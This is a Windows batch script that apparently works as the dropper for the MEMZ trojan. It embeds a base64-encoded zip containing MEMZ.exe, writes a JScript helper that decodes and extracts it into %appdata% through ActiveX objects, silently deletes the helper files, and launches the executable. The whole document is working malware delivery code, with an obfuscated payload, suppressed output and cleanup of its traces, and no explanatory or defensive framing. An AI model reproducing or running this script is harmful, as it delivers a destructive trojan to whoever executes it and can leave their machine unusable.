
@echo off

echo tOIBEncrSQvxpnwPctoDXnlfT164qCVxxvJBatqwLxy0d3ro5NruyVgT5Hkp2Ejk+GAQpzPIhZxC>>x
echo OMRu9Qk9tJNmv18UDXcpF06GPtgM83B9lNghdEomiYtEs5yrDClBmVpoqvgOARLSybQRDtLpdjaI>>x
echo VIdFOitWQOixWME0qOL3l4pHlmM9Rf98zIpxIPk65mH6MVTG4Y6XGbry/nMV4GdrNb7dFm2/+Au6>>x
echo B2xuk5jWi0E2a9QyFpc/9gRoOmMqKhpVoJu4lbFdwA2NH9396meimIuZe6Q3a1vsdtrRPmb8m/j0>>x
echo 68BAVrppxDQ/XRTl4TZFLZdlLlLbKoYvRy3jsWpMhBZsYlouunYPhxVr0COmLUULeDEtRLU4wUaH>>x
echo 0RjzYJs8YGX44l3q2BX0RcMX3Ulnm0RRlIzrsLUOFY/QZb/dZhNPuBXf37Ue9E58f3A9tcllWKdC>>x
echo NtJe6ht3XVbMuPcvMIkzG/oU/YyYxknSzNg9CNvYbDbnzTOhHpvsU3ssjx+1PM6h54VSjD9qeYrA>>x
echo 66zR8Ei0/VC0/XC0/Ui0/flo+3C0/dVo+7Fo++vR9jfFtJNUwyhuh9tB61aQe1Nyvct4/jV1j+Uk>>x
echo BIpJDOjbGXm81Dixe3jHnzFVhT8nGA87HZLr3knnn4y2jw98KoY1bqWY5pQ0TN0oblTqv2WrYstM>>x
echo ZFv6c+nwnKHf6k98i0laO6gwr5TwgQvGX5VNP0dHzPlWf81CExnclXIF6jCvlLCB992EurtEttU2>>x
echo ND+bGucPMATjVv31HphpaJVkrz/C7hFI51bCW+Jy9l6Vc2zgihhOdDNnW0XqIpSkWPw6XNY5tow6>>x
echo KqWY6FafXYHuVhBLMr5tk+Y7TxXK2t8HMmXzTwE19OnQfOqW25a+wFHTbmPEPxiHrdZWp34ebGGV>>x
echo LbV24DXNylV0fOC0U5cDV/vDXy8NFdN98SLdOu6iNmcNavjIwHiCbG2KGy2dwIV7nTTWTyjTSc+h>>x
echo BsGFNJEqj0Aji8+BllntwaWgy+uHzJUT79hpFZDN7qhzdQbsgT70pdK11ONI90hUGuxeHqPulrgK>>x
echo Xi+I1eHS1EYG43LRQWZyF2OjGnAJ4N5X5bFTHbwwIbkgeJBX+I2FNp/dH3QKCIn3q+LrMxaucQWC>>x
echo oTay7yqmAbsbPH+uXOsROieU+Fy8JSmRNEgr8PA+jEPq2mCpMxbmS0G2nUpaL5+QbeSyspn+qOCB>>x
echo GHEcIT8h1S4k/7jNTA4j/0WozttcPlzJg5ZecoBU891yk4qFEXXKJtwu6UVPWp6F7iNvfIXyQIra>>x
echo TrnLKUY9j6ytC3pIUcb5VAoY8TslNBVnVCMIWy29IK5q8Tnx/jk0+QZG+hzxuTT3wVnfRrZJ2Fof>>x
echo MgdylFQH7D21XTSJ+Q7lLBOoriI8pJV+IsD7gas9TbhKkrQp8rSRb1F54E9BIWAVIC0b96+J9iLa>>x
echo XeaIgTFoDFqDzpBqSDdkGlhDtmGpIdfAGRCHDTUGq2GDYbPBCWv2Gv4XwsY/yv+35X8CUEsBAhQA>>x
echo FAAAAAgAdXfqSJDoh9lzIQAAADoAAAgAAAAAAAAAAAAAAP+BAAAAAE1FTVouZXhlUEsFBgAAAAAB>>x
echo AAEANgAAAJkhAAAAAA==>>x

echo f=new ActiveXObject(^"Scripting.FileSystemObject^");i=f.getFile(^"x^").openAsTextStream();>x.js
echo x=new ActiveXObject(^"MSXml2.DOMDocument^").createElement(^"Base64Data^");x.dataType=^"bin.base64^";>>x.js
echo x.text=i.readAll();o=new ActiveXObject(^"ADODB.Stream^");o.type=1;o.open();o.write(x.nodeTypedValue);>>x.js
echo z=f.getAbsolutePathName(^"z.zip^");o.saveToFile(z);s=new ActiveXObject(^"Shell.Application^");>>x.js
echo s.namespace(26).copyHere(s.namespace(z).items());o.close();i.close();>>x.js

set v="%appdata%\MEMZ.exe"
del %v% >NUL 2>NUL
cscript x.js >NUL 2>NUL
del x.js >NUL 2>NUL
del z.zip >NUL 2>NUL
del x >NUL 2>NUL
start "" %v%
